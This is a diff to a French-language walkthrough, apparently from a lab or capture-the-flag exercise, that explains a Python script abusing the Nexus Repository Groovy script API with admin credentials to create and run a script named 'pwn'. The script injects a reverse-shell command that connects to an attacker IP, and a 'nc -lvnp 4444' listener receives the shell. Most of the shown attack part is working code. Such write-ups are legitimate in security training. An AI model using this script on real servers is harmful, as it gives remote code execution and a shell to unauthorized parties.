@@ -152,6 +152,7 @@ Une fois activée, tu peux créer, stocker et exécuter des scripts Groovy nomm�
 Le bloc de configuration définit la base d’URL de Nexus, les identifiants, et l’IP/port de ton listener.
 Ces valeurs sont utilisées dans les appels HTTP et injectées dans la commande du reverse shell.
 
+import requests
 BASE = "http://192.168.58.159:8081"
 AUTH = ("admin", "3e409e89-514c-4f9f-955e-dfa5c4083518")
 ATTACKER_IP = "192.168.49.58"
@@ -178,9 +179,12 @@ create = requests.post(f"{BASE}/service/rest/v1/script", auth=AUTH,
                        json={"name":"pwn","type":"groovy","content":content})
 
 if create.status_code == 409:
+    # Existe déjà: on met à jour le contenu
     requests.put(f"{BASE}/service/rest/v1/script/pwn", auth=AUTH,
                  headers={"Content-Type":"application/json"},
                  json={"content":content})
+elif create.status_code >= 400:
+    print("Create failed:", create.status_code, create.text)
 
 L’exécution du script passe par POST /service/rest/v1/script/pwn/run.
 Cet endpoint attend Content-Type: text/plain (correction d’un 415 “Unsupported Media Type” si on envoie du JSON).
@@ -188,6 +192,8 @@ Le corps peut être vide; il sert juste à déclencher l’exécution.
 
 run = requests.post(f"{BASE}/service/rest/v1/script/pwn/run", auth=AUTH,
                     headers={"Content-Type":"text/plain"}, data="")
+print("Create:", create.status_code, "Run:", run.status_code)
+print("Run body:", run.text[:200])
 
 Enfin, le script affiche les codes retours de création et d’exécution, ainsi qu’un extrait de la réponse.
 Pendant ce temps, tu dois avoir lancé ton listener nc -lvnp 4444 sur 192.168.49.58 pour recevoir le shell
